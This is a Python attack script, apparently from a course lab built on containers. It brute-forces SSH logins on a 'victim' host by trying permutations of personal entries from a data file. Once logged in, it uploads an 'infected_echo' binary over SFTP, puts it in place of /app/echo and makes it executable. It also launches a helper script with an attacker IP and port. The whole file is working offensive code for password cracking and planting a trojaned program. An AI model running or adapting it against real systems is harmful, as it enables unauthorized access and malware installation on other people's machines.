import paramiko
import itertools
import time
import logging
import os
import sys
logging.getLogger("paramiko").setLevel(logging.CRITICAL)

n = len(sys.argv)
if n != 4:
    print("Usage: python3 crack_attack.py <victim_ip> <attacker_ip> <port>")
    exit(1)

# SSH target info
hostname = sys.argv[1]  # Victim container's IP
port = 22
username = "csc2025"
max_retries = 10

os.system(f"./script.sh {sys.argv[2]} {sys.argv[3]}")

# Read info entries from file
with open("/app/victim.dat", "r") as f:
    entries = [line.strip() for line in f if line.strip()]

# Try all combinations (1 to 3 entries)
for r in range(2, len(entries) + 1):
    for combo in itertools.permutations(entries, r):
        for i in range(max_retries):
            password = ''.join(combo)
            print(f"[TRY] Trying password: {password}")

            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(hostname=hostname, username=username, password=password)
                print(f"[SUCCESS] Found password: {password}")
                time.sleep(2)
                sftp = ssh.open_sftp()
                sftp.put("infected_echo", "/app/echo")
                ssh.exec_command("chmod 755 /app/echo")
                sftp.close()
                ssh.close()
                exit(0)
            except paramiko.AuthenticationException:
                break
            except Exception as e:
                print(f"[ERROR] {e}")
                print("Retrying...")
                continue

print("[FAIL] No valid password found")

